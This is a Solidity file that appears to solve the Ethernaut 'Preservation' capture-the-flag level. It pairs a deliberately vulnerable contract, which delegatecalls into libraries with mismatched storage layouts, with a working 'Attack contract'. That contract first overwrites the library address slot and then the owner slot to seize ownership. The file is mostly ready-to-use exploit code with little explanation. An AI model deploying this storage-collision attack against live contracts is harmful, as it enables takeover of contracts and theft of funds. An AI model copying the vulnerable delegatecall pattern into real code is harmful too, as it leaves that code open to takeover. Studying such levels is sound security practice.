// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Preservation {
    // public library contracts
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    uint256 storedTime;
    // Sets the function signature for delegatecall
    bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

    constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public {
        timeZone1Library = _timeZone1LibraryAddress;
        timeZone2Library = _timeZone2LibraryAddress;
        owner = msg.sender;
    }

    // set the time for timezone 1
    function setFirstTime(uint256 _timeStamp) public {
        timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }

    // set the time for timezone 2
    function setSecondTime(uint256 _timeStamp) public {
        timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
    }
}

// Simple library contract to set the time
contract LibraryContract {
    // stores a timestamp
    uint256 storedTime;

    function setTime(uint256 _time) public {
        storedTime = _time;
    }
}

// Attack contract
contract PreservationSolver {
    uint256 slot0;
    uint256 slot1;
    // This is the same slot as owner in the Caller contract (Preservation)
    uint256 slot2;

    function setTime(uint256 _time) public {
        slot2 = _time;
    }

    function swapLibrary1(address preservationAddress) public {
        Preservation preservation = Preservation(preservationAddress);
        preservation.setFirstTime(convertAddressToUint(address(this)));
    }

    function swapOwner(address preservationAddress, address owner) public {
        Preservation preservation = Preservation(preservationAddress);
        preservation.setFirstTime(convertAddressToUint(owner));
    }

    function convertAddressToUint(address a) public pure returns (uint256) {
        return uint256(uint160(a));
    }
}
